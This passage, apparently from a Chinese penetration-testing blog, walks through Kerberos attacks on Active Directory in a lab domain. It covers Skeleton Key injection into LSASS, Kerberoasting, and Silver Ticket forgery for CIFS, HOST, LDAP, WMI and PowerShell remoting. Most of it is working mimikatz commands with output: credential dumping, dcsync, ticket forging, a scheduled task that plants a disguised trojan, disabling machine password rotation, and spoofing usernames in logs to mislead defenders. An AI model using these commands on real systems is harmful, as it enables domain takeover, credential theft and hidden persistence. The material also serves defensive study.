![image-20211123151539439](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-20211123151539439.png)



再次访问:

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-17161473812d4dc681e5742797e5d3a4.png)



##### 其他利用模块

- MSF-kiwi
- [Kerberoasting](https://github.com/OneBitSec/kerberoast)

> 一些[Kerberoasting的用法](https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting)



#### Skeleton Key

> Skeleton Key(万能密钥)是一种部署在域控制器上的密码统一管理后门。(放在此篇文章中的原因也很简单，快醒醒，金钥注入以后就可以使用他了!)

其实根据命名我们便可以知道，该后门程序可以使用一串密码登录目标域账户


Skeleton Key是如何实现这种功能的呢？很高兴你问了，这要从Windows身份认证说起:


Microsoft Windows在网络中使用两个不同的包进行身份验证:

- NTLM
- Kerberos



这些身份认证包被加载到本地安全机构子系统服务(LSASS)进程和动态链接库(DLLs)进程中



当认证服务和程序运行时，会将这些文件加载至内存中以便使用，Skeleton Key的运行类似于一些游戏**客户端**作弊器，他们修改相关的内存地址去欺骗判定以便于实现作弊操作。



**如果还是不懂，我们表达的再详细一点**:
Skeleton Key攻击会篡改上述的两种身份验证方法。



> 在NTLM身份验证期间，Skeleton Key会注入到LSASS进程中，并创建一个主密码，该主密码 **适用于域中的任何账户**，并且与这些账户原有的密码**不冲突**，也不会覆盖，不会与SAM数据库匹配。
> 在用户进行登录时，如果密码与Skeleton Key注入的NTLM-Hash相匹配，则完成身份认证准许登录。
>
> 在Kerberos身份认证期间，Kerberos加密方式将降级为不支持salt(RC4_HMAC_MD5)的算法，从活动目录中检索到的NTLM-Hash将被替换为Skeleton Key的NTLM-Hash值，Skeleton Key的主密码将在服务器端进行验证，从而通过Kerberos认证。



**你可能注意到了,不是客户端吗，这么会在服务器进行验证？**



不要忘记，域认证的关键点可是在于AD数据库----Skeleton Key是以管理员权限运行在域控中的。既然说到这里了，不妨看看先决条件👇

- 域管权限
- DC上执行
- 重启DC将会删除此恶意软件，必须重新部署(因为是注入到内存中的)，当然可以使用计划任务或是其他方法重新注入

> PS:Skeleton Key是一个概念，而不是一款软件的名称，该后门可以通过多种工具进行注入,由于特性所以被称为Skeleton Key。



在实验环境测试前，先说几个重点:

- Skeleton Key已被检测具有以下文件名的64位DLL文件

```
msuta64.dll
ole.dll
ole64.dll
```

- AD域控制器可能会遇到复制问题，如果导致用户联系技术支持，得到的建议便是重启，会导致从内存中删除后门
- 攻击者可以使用PsExec来执行创建不同的服务，但是会在windows日志中留下痕迹
- 该恶意后门注入在本地内存中，并且不进行网络通信，IPS/IDS很难检测
- 原版mimikatz使用的Skeleton Key主密码为"mimikatz"，容易被鉴别。
- 

##### 实验环境测试

> 以下实验环境均为域管理员权限

> 如果出现ERROR kuhl_m_misc_skeleton; OpenProcess (0x00000005)的报错是因为微软在注册表项中设置了防止lsass.exe的注入，需要使用mimikatz输入以下命令

```powershell
privilege::debug
!+
!processprotect /process:lsass.exe /remove
```



##### 使用mimikatz注入Skeleton Key



在DC上使用管理员权限执行

```powershell
mimikatz.exe "privilege::debug" "misc::skeleton" exit exit
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-188c6caa96a64042a2d27f76f54f92d7.png)



在其他主机上输入错误密码时:

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-b4716836cac84c1b8c14401d878f59f4.png)



在其他主机上输入主密码/万能密码时:

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-c32c0326e44d424182999c392d3eb58f.png)



查看磁盘发现成功连接目标主机:

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-f61dd3ffef5746a9a757be26f1aaea3f.png)

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-afb215f22d504d9bba9c6b4b7ccdb296.png)



##### 使用Metasploit(MSF) Kiwi模块注入Skeleton Key

```powershell
load kiwi
kiwi_cmd misc::skeleton
shell
powershell
net use xxxx....
```



##### 更多

除了这上诉可以调用mimikatz脚本远程注入的程序外，还有很多，这些远程脚本注入可以有效地将脚本运行在内存而不是残留本地文件，比如:

- Koadic
- CS
- Empire
- 等等



#### Silver Ticket

> 银票(Silver Ticket)是攻击者**伪造**的一张Kerberos 票证授予服务 (TGS) 票证，也称为服务票证(Service Ticket)，与金钥一样，同属于PTT攻击的一种。



如下图所示，因为银票是伪造Service Ticket的一种攻击方式，其原理是伪造TGS-REQ所请求、TGS-REP所返回的 **TGS/Service Ticket** ，在随后的通讯过程中基本均是不经过KDC从而直接与目标服务进行通信(因为Silver TIcket是伪造的Service Ticket，所以也 **无法** / **无需** 与KDC进行通信)。所以下图Silver Ticket攻击示意图中缺少了AS-REQ/AS-REP与TGS-REQ/TGS-REP过程。
​

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-90ccab725de042e1b48be5efe59b61a6.png)



再进行Service Ticket伪造之前，先注意银票的以下特点:

- Kerberos 银票是攻击者伪造的一张有效的票据授予服务(TGS)的Kerberos票据(Service Ticket)，因为它是由Kerberos认证服务(AS)中每台配置了SPN的服务器的[服务账户](https://stealthbits.com/blog/service-accounts-attacks-and-how-to-protect-against-them/)加密/签名的。
- 金票是伪造的 TGT，可有效访问任何 Kerberos 服务，而银票是伪造的 TGS Ticket (Server Ticket)。这意味着 Silver Ticket 范围仅限于针对特定服务器的任何服务,但因为银票基本无需与KDC通讯，所以基本不会在DC上残留日志。
- 黄金票是用域 Kerberos 服务帐户 (KRBTGT)加密/签名的，而银票是由服务帐户(从计算机的本地 SAM 或服务帐户凭据中提取的 **计算机帐户** 凭据)加密/签名的。
- **大多数** 服务不验证 PAC(通过将 PAC 校验和发送到域控制器进行 PAC 验证)，因此使用服务帐户密码哈希生成的有效 TGS Ticket 可以包含 **完全虚构的 PAC** ——甚至声称用户是域管理员也无需质疑或更正。



> 这里还有一个小插曲，服务验证不验证PAC是由MS-APDS协议规范中规定的:
>
> - *Windows 2000 Server and Windows XP do not validate the PAC when the application server is running under the local system context or has SeTcbPrivilege, as specified in [MS-LSAD] section 3.1.1.2.1. Otherwise, Windows 2000 Server and Windows XP use Kerberos PAC validation.*
> - *Windows Server 2003 does not validate the PAC when the application server is running under the local system context, the network service context, or has SeTcbPrivilege. Otherwise, Windows Server 2003 uses Kerberos PAC validation.*
> - *Windows Server 2003 with SP1 does not validate the PAC when the application server is under the local system context, the network service context, the local service context, or has SeTcbPrivilege privilege. Otherwise, Windows Server 2003 with SP1 and future service packs use Kerberos PAC validation.*
> - *Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows 8, Windows Server 2012, Windows 8.1, and Windows Server 2012 R2 do not validate the PAC by default for services. Windows still validates the PAC for processes that are not running as services. PAC validation can be enabled when the application server is not running in the context of local system, network service, or local service; or it does not have SeTcbPrivilege, as specified in [MS-LSAD] section 3.1.1.2.1.*



简单来说，当进程以SYSTEM身份运行或具有 "SeTcbPrivilege"(作为操作系统的一部分行事)权限设置时，windows不会验证PAC(默认)，就造成了我们能够随意定义PAC内容，这也是银钥最为关键的内容之一。

- TGS 是伪造的，因此没有关联的 TGT，这意味着永远不会联系 KDC。
- 任何事件日志都在目标服务器上。
- 攻击者需要获得目标服务账号的NTLM-Hash





##### 如何获得创建银票的所需信息



1. 使用powershell进行LDAP侦察获得服务账户名

> 由于服务账户利用SPN来支持Kerberos身份验证，所以使用Powershell查询以注册的SPN值就可以获得服务账户的用户名

```powershell
#脚本如下
#Build LDAP Filter to look for users with SPN values registered for current domain
$ldapFilter = "(&(objectclass=user)(objectcategory=user)(servicePrincipalName=*))"
$domain = New-Object System.DirectoryServices.DirectoryEntry
$search = New-Object System.DirectoryServices.DirectorySearcher
$search.SearchRoot = $domain
$search.PageSize = 1000
$search.Filter = $ldapFilter
$search.SearchScope = "Subtree"
#Execute Search
$results = $search.FindAll()
#Display SPN values from the returned objects
foreach ($result in $results)
{
    $userEntry = $result.GetDirectoryEntry()
    Write-Host "User Name = " $userEntry.name
    foreach ($SPN in $userEntry.servicePrincipalName)
    {
        Write-Host "SPN = " $SPN       
    }
    Write-Host ""    
}
#运行
PowerShell.exe -ExecutionPolicy Bypass -File <filename>
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-923a66478f8342f2824a15dd58acf8b4.png)



但是一些服务不会生成服务账户，这些账户不通过SPN与Kerberos交互，并且没有SPN值，但是大多数企业都有统一的命名规范(例如:SVC)，下列脚本将会查找包含SVC的用户名


```powershell
#Build LDAP Filter to look for users with service account naming conventions
$ldapFilter = "(&(objectclass=Person)(cn=*svc*))"
$domain = New-Object System.DirectoryServices.DirectoryEntry
$search = New-Object System.DirectoryServices.DirectorySearcher
$search.SearchRoot = $domain
$search.PageSize = 1000
$search.Filter = $ldapFilter
$search.SearchScope = "Subtree"
#Adds list of properties to search for
$objProperties = "name"
Foreach ($i in $objProperties){$search.PropertiesToLoad.Add($i)}
#Execute Search
$results = $search.FindAll()
#Display values from the returned objects
foreach ($result in $results)
{
    $userEntry = $result.GetDirectoryEntry()
    Write-Host "User Name = " $userEntry.name
    Write-Host ""    
}
```

> 如果拥有管理员权限，则可以对服务账户进行枚举，Invoke-Kerberoast.ps1脚本、Kerberoast工具包中的GetUserSPNs脚本、PowerSploit的GET_NetUser命令等



拥有管理员权限利用mimikatz转存账户密码hash

```powershell
Mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit exit
```



2. 使用kerberoasting对服务账户密码进行破解

> [这篇文章](https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting)中详细介绍了Kerberoasting的攻击原理，简单来说通过扫描获取到拥有SPN值的用户账户，再使用SPN值从AD请求服务票证，再将服务票证从内存中提取到本地文件，再爆破攻击密码
> 此外这是一些关于服务默认SPN的[列表](https://adsecurity.org/?page_id=183)
> 爆破密码并不是无脑字典，可以根据前期信息收集获得的密码规则进行生成



请求服务账户SPN的服务票证

> 需要了解System.IdentityModel模块在低版本系统中是没有的，结解决方式请参照[这里](https://www.sqlservercentral.com/blogs/powershell-add-type-–-where’s-that-assembly)

```powershell
Add-Type –AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList '<SPN>'
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-185f2021975d43edb29b42da75bec50f.png)

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-5b11c5db45d84f06b08c16dd6af023be.png)


使用mimikatz提取服务票证

> 是个好方法，但是缺点很大，会导出所有活动的票据，如果有一万个则会导出一万个

```powershell
mimikatz.exe "kerberos::list /export" exit exit
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-5b53f353bb974e37907e3a868fc3528f.png)



如图所见，在实验环境下单次导出了6张票据，虽然有administrator的票据但是在现实环境中票据数量可能达到成百上千张,关于筛选票据的内容可以查看[这篇文章](https://malicious.link/post/2016/kerberoast-pt2/)，但是建议使用帝国模块，powershell的脚本我尝试后没有输出文件。

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-485f47bafcff42af8445ed52d565bb1f.png)



将文件传至kali，并在kali下载kerberoast

> 使用hashcat什么的都可以，看个人喜欢
> 如果是windows环境，可以查看[这篇文章](https://msitpros.com/?p=3113)进行环境部署

```bash
#all python3
pip install PyCrypto
pip install PyASN1
git clone https://github.com/nidem/kerberoast.git
cd kerberoast
```



使用密码离线爆破服务账户密码

```powershell
python3 tgsrepcrack.py <WordDict File> <Ticket File>
```

![image-20211123152649813](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-20211123152649813.png)



3. 将明文密码转换为NTLM HASH

```python
#python script
import hashlib,binascii
hash = hashlib.new('md4', "<password>".encode('utf-16le')).digest()
print binascii.hexlify(hash)
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-e4f22754d3fc4a3faa9d3cd596756375.png)



4. 域SID

```powershell
whoami /user
```

![image-20211123152842902](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-20211123152842902.png)



5. 目标主机 & 服务类

> 将从SPN中提取，以下是SPN的命名格式

```powershell
<service class>/<host>:<port>/<service name>
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-f80810a49cf04619a67ff77b0c9409c7.png)



6. 用户&组

> 组PAC可以伪造指定，用户也可随意伪造， **前提是进程以SYSTEM身份运行或具有 "SeTcbPrivilege"权限**



##### 使用mimikatz制造银票(SQL Server服务)

```powershell
mimikatz.exe "kerberos::golden /user:<username> /domain:<domain name> /sid:<domain SID> /target:<taget domain> /rc4:<services account HASH> /service:<service class> /ptt" exit exit

#例如
mimikatz.exe "kerberos::golden /user:HelloHacker /domain:onebit.lab /sid:S-1-5-21-3785948476-599174919-4239617280 /target:web.onebit.lab:1433 /rc4:13b29964cc2480b4ef454c59562e675c /service:MSSQLSvc /ptt" exit exit
```



未使用票据情况:

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-966681eec79d4c24843e4afba4b80971.png)



使用票据后:

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-a77dbb3cc6a443f29604516ede0b6116.png)

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-7d5ff0d6348d4d3db511bee4aa40c75c.png)

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-02abdb58595446bc81c4e46dc137e85b.png)



> 可以看到SQLServer运行账户并不是SQLDBA，而是Administrator，原因是没有指定ID参数，mimikatz会默认设置为500，也就是默认域管Administrator。大部分应用默认域管都有权限使用，如果没有可以枚举UID进行尝试。



#### 白银票据进阶

> 一旦攻击者可以访问计算机账户密码hash(注册表 **HKLM\SECURITY\Policy\Secrets$machine.ACC** 中)，就意味着这些账户可以作为"用户"账户来访问/查询AD，



- 计算机密码策略与其说是规则，不如说是一种“指南”——计算机在它认为需要时更新密码，但域不会阻止密码早于策略设置的计算机帐户。也就是说规则虽然设定，但是不会被强制执行，密码未进行更改也可以进行身份验证
- 计算机账户(和相关密码)不会像用户账户那样过期，并且在DC上进行更改后，计算机密码更新不会发送到PDC(主域控)
- 计算机的Netlogon服务处理计算机密码更新，而不是AD
- 计算机(和 AD)存储当前密码和前一个密码(分别为 CurrVal 和 OldVal 键，位于上面的注册表位置)。
- 密码存储在 unicodepwd(当前密码)和 lmpwdHistory(以前的密码)属性中的计算机帐户对象中。此更新的时间戳以 integer8 格式存储在 pwdlastset 属性中。
- [更多机器账户密码策略规则](https://adsecurity.org/?p=280)



从上面这些资料我们可以知道，一旦攻击者掌握了计算机账户的密码，就可以长期使用，即使计算机账户密码策略设定密码一天一改，但是一万年不更改计算机密码，AD也不会组织计算机账户进行认证和访问资源。



攻击者可以通过以下方式阻止计算机账户密码更改:



2. 修改注册表项为

```powershell
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1
```



3. 有一个客户端组策略设置，可以防止计算机账户更改密码，常用于支持VDI(虚拟桌面)。启用"[Domain member: Disable machine account password changes](https://technet.microsoft.com/en-us/library/jj852191.aspx)"客户端组策略，可以阻止[GPO](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/Policy/group-policy-objects)(组策略对象)对此台计算机密码的修改。

> "_ Domain member: Disable machine account password changes_"策略决定了域成员是否定期更改其计算机账户密码。
> 将其值设定为"*Enabled*"可以防止域成员更改计算机账户密码。
> 将其设定为"*Disabled*"允许域成员按照"*Domain member: Maximum machine account password age policy setting*"中的设定更改计算机密码。(默认情况下每30天一次)



4. 域组策略(Domain Group Policy)中的"[Domain member: Maximum machine account password age](https://technet.microsoft.com/en-us/library/jj852252.aspx)"负责告诉加入域的计算机应该多长时间更改一次机器账户密码(和上文中一样，不是强制)。默认情况下该值为30，单位是天，将值设为0则无法改变机器账户密码。



5. 域控组策略"[Domain controller: Refuse machine account password changes](https://technet.microsoft.com/en-us/library/cc739351(v=ws.10).aspx)"使域控制器阻止客户端在AD中更新其计算机账户密码。

> 该设置决定了DC是否拒绝成员计算器更改计算机账户密码的请求，默认情况下，成员计算机每30天改变一次计算机账户密码。如果启用，DC将拒绝计算机账户更改请求。



**以上是目前有效的方法。即使在所有的用户、管管理员和服务账户密码被修改后，攻击者任然能够访问的方法。** 

> 但前提是攻击者能够获取到计算机账户的hash和禁止修改计算机账户密码



下表中绘出了计算机账户托管的服务和所需的相关银票服务👇



| Service Type 服务类型                                        | Service Silver Tickets 服务票证类型               |
| ------------------------------------------------------------ | ------------------------------------------------- |
| WMI                                                          | HOST RPCSS                                        |
| PowerShell Remoting                                          | HOST HTTP 根据操作系统版本可能还需要: WSMAN RPCSS |
| WinRM                                                        | HOST HTTP                                         |
| Scheduled Tasks 计划任务                                     | HOST                                              |
| Windows File Share (CIFS) Windows文件共享                    | CIFS                                              |
| LDAP operations including Mimikatz DCSync LDAP操作，包括mimikatz DCsyn | LDAP                                              |
| Windows Remote Server Administration Tools Windows远程服务器管理工具 | RPCSS LDAP CIFS                                   |



> 关于更多的服务与SPN的详细信息请查看[这里](https://adsecurity.org/?page_id=183)



**实战利用银票进阶技巧进行访问维持**

> 首先，可以在拥有域管理员权限的情况下、转储NTDS.dit与SYSTEM文件，或者使用mimikatz导出全部HASH

> PS:一般机器&服务账户以"$"结尾，主机名为用户名，为隐藏账户



##### 使用mimikatz导出全部hash

```powershell
mimikatz.exe "lsadump::dcsync /domain:<domain> /all /csv" exit exit
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-39092f4bf38042f488dd078907955ed4.png)



##### 创建winodws共享(CIFS)管理员银票

> **/id:参数为目标计算机账户的UID，可以随意填写**

```powershell
mimikatz.exe "kerberos::golden /admin:<username> /id:<UID> /domain:<domain name> /sid:<domain SID> /target:<taget domain> /rc4:<computer account HASH> /service:cifs /ptt" exit exit

#例:
mimikatz.exe "kerberos::golden /user:WebFakeUser /id:1113 /domain:onebit.lab /sid:S-1-5-21-3785948476-599174919-4239617280 /target:web.onebit.lab /rc4:1af40963f37a84369865120c44986bb9 /service:cifs /ptt" exit exit
```



创建计算机账户"web$"银钥，访问CIFS👇



查看目标计算机账户UID、用户名、NTLM HASH

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-3dfd998ebe664ca6bd3cf07bffa24e3f.png)



生成银钥

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-45fdfd96ebc04f52ba8c46e4a25316de.png)



查看密钥列表

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-b385e1e674e94e759dd0af5413c36ef8.png)



未注入票据前

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-840081bfc9c945948c7fb69dba932709.png)



注入票据后

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-eff922380f55432c9cc70e4f211f727d.png)



>  注入CIFS 银钥后，我们可以访问目标计算机上的任何共享，可以写入或复制共享文件。 **由于我们指定的/user:参数为假用户名，日志记录的将也是该用户名，我们可以伪造一个已经存在的用户名，让运维人员以为是该用户被入侵** 。
> 如下图，我们可以看到在日志中记录的是我们伪造的用户名(SID最后的UID可以通过ID参数控制)

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-387b617481ed43f994aac4929cb9968f.png)



##### 创建具有管理员访问权限的windows计算机(HOST)银票

> 该票据拥有目标计算机上"HOST"所覆盖的任何windows服务的管理权限，其中包括计划任务。
> **HOST服务代表计算机主机，其SPN用于访问主机计算机账户** 

```powershell
mimikatz.exe "kerberos::golden /admin:<username> /id:<UID> /domain:<domain name> /sid:<domain SID> /target:<taget domain> /rc4:<computer account HASH> /service:HOST /ptt" exit exit

#例:
mimikatz.exe "kerberos::golden /admin:HOSTFakeUser /id:1688 /domain:onebit.lab /sid:S-1-5-21-3785948476-599174919-4239617280 /target:web.onebit.lab /rc4:1af40963f37a84369865120c44986bb9 /service:HOST /ptt" exit exit
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-7ba010c8e0564ddfa12047f0543d4625.png)


创建计划任务

> 关于schtasks命令使用详细方法请查看[微软文档](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks#feedback)

```powershell
#创建一个每次开机时以SYSTEM权限运行的名为"Microsoft System Auto Check"的木马文件
schtasks /create /S web.onebit.lab /SC ONSTART /RU "NT Authority\System" /TN "Microsoft System Auto Check" /TR "c:\windows\temp\CSRAT.exe" 
```



未导入银票前：

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-1ea6ab22524c46299b99b416e89b7cdc.png)



导入银票并创建计划任务后：

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-f6e71ac7309d4d49a0cfd2ac62f7ed41.png)



> 如果返回错误"无法加载列资源"
> 输入chcp 437切换为英文即可

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-d1f452196a5445bd9f3f78d2ff60ce57.png)



删除计划任务

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-70e1cabbd2c9499fbe3ac4347cafd86d.png)



##### 创建可远程连接管理员权限powershell的银票

> 由于远程powershell要使用http协议通信，所以同时要注入http与wsman银票
> 考虑到需要传输文件或者远程下载脚本(不推荐),我还注入了cifs票据

```powershell
mimikatz.exe "kerberos::golden /admin:<username> /id:<UID> /domain:<domain name> /sid:<domain SID> /target:<taget domain> /rc4:<computer account HASH> /service:HTTP /ptt" exit exit

mimikatz.exe "kerberos::golden /admin:<username> /id:<UID> /domain:<domain name> /sid:<domain SID> /target:<taget domain> /rc4:<computer account HASH> /service:wsman /ptt" exit exit

#example
mimikatz.exe "kerberos::golden /admin:hellopowershell /domain:onebit.lab /id:1134 /sid:S-1-5-21-3785948476-599174919-4239617280 /target:web.onebit.lab /rc4:1af40963f37a84369865120c44986bb9 /service:cifs /ptt" exit exit

mimikatz.exe "kerberos::golden /admin:hellopowershell /domain:onebit.lab /id:1134 /sid:S-1-5-21-3785948476-599174919-4239617280 /target:web.onebit.lab /rc4:1af40963f37a84369865120c44986bb9 /service:wsman /ptt" exit exit

#连接
New-PSSession -Name PSC -ComputerName <computername> ; Enter-PSSession -Name PSC
```



这里需要开启并配置 PowerShell Remoting 和 WinRM

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-d186615633b4403b91127753e8e6db83.png)

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-b9baa1c4df074aaba3a6ded0eabeb4c9.png)



在注入两个 Silver Tickets，http 和 wsman 之后，我们可以使用 PowerShell Remoting(或 WinRM)打开一个到目标系统的 shell(假设它配置了 PowerShell Remoting 和/或 WinRM)。 New-PSSession 是 PowerShell cmdlet，用于使用 PowerShell 创建到远程系统的会话，Enter-PSSession 打开远程 shell

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-c5fdc1e726644c06a789b19ce9ee17cd.png)

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-26aa1b4167584507855ff628e6be61a8.png)



##### 创建可以访问LDAP协议导出HASH的银钥

```powershell
mimikatz.exe "kerberos::golden /admin:<username> /id:<UID> /domain:<domain name> /sid:<domain SID> /target:<taget domain> /rc4:<computer account HASH> /service:LDAP /ptt" exit exit

#远程导出HASH
mimikatz.exe "lsadump::dcsync /dc:<dc domain> /domain:<domain> /all /csv" exit exit
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-5a8ef5ec8b27460884b874d88a710976.png)

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-e6ce6d21ad384952bd4801ed929dc4e0.png)



导入密钥前：

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-4d491dd2fa2b4d888206a3802960bf7a.png)



导入密钥后：

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-fef333aebc814971ab3cdc3b5cbfe7e3.png)



##### 创建能够远程使用WMI的银票

> 此票据需要同时创建host与rpss服务票据

```powershell
mimikatz.exe "kerberos::golden /admin:<username> /id:<UID> /domain:<domain name> /sid:<domain SID> /target:<taget domain> /rc4:<computer account HASH> /service:host /ptt" exit exit

mimikatz.exe "kerberos::golden /admin:<username> /id:<UID> /domain:<domain name> /sid:<domain SID> /target:<taget domain> /rc4:<computer account HASH> /service:rpcss /ptt" exit exit

#example:
mimikatz.exe "kerberos::golden /admin:hellowmic /id:1188 /domain:onebit.lab /sid:S-1-5-21-3785948476-599174919-4239617280 /target:web.onebit.lab /rc4:1af40963f37a84369865120c44986bb9 /service:host /ptt" exit exit

mimikatz.exe "kerberos::golden /admin:hellowmic /id:1188 /domain:onebit.lab /sid:S-1-5-21-3785948476-599174919-4239617280 /target:web.onebit.lab /rc4:1af40963f37a84369865120c44986bb9 /service:rpcss /ptt" exit exit

